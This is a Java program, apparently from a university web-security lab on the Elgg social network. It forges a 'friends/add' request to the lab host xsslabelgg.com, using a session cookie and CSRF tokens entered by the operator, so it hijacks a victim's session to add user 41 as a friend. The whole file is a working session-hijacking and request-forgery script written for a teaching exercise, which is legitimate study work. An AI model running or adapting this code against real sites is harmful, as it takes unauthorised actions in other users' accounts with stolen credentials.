import java.io.*;
import java.net.*;
import java.util.Scanner;

public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
		try {
			int responseCode;
			InputStream responseIn=null;
			Scanner in = new Scanner(System.in);
			System.out.println("Enter ts:");
			String ts = in.next();
			System.out.println("Enter token:");
			String token = in.next();
			System.out.println("Enter cookie:");
			String cookie = in.next();
			String requestDetails = "&__elgg_ts=" + ts + "&__elgg_token=" + token;
			// URL to be forged.
			URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=41"+requestDetails);
			
			HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}
			
			urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
			urlConn.addRequestProperty("Cookie", "Elgg=" + cookie);
			//HTTP Post Data which includes the information to be sent to the server.
			//String data = "name=...&guid=..";
			String data = "friend=41" + requestDetails;
			// DoOutput flag of URL Connection should be set to true
			// to send HTTP POST message.
			urlConn.setDoOutput(true);
			
			OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
			wr.write(data);
			wr.flush();
			
			if (urlConn instanceof HttpURLConnection) {
				HttpURLConnection httpConn = (HttpURLConnection) urlConn;
				
				responseCode = httpConn.getResponseCode();
				System.out.println("Response Code = " + responseCode);
				
				if (responseCode == HttpURLConnection.HTTP_OK)
					responseIn = urlConn.getInputStream();
				
				BufferedReader buf_inp = new BufferedReader(
				new InputStreamReader(responseIn));
				String inputLine;
				while((inputLine = buf_inp.readLine())!=null) {
					System.out.println(inputLine);
				}
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}	
}
